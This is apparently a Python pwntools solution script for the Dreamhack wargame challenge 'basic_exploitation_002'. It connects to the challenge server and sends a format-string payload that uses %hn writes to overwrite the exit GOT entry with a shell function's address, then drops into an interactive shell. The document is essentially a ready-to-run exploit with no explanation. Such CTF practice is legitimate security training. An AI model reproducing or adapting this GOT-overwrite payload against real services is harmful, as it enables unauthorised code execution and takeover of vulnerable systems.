#!/usr/bin/python

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 8915)
elf = pwn.ELF("./basic_exploitation_002")

shell = "\x1b\x86\x04\x08"
# other = "%2052c%1$hn%32779c%2$hn"
exit = elf.got['exit']
# exit = 0x0804a024 #
payload = pwn.p32(exit)
payload += pwn.p32(exit)
payload += b"%2044c"
payload += b"%1$hn"
payload += b"%32261c"
payload += b"%2$hn"

p.send(payload)
p.interactive()
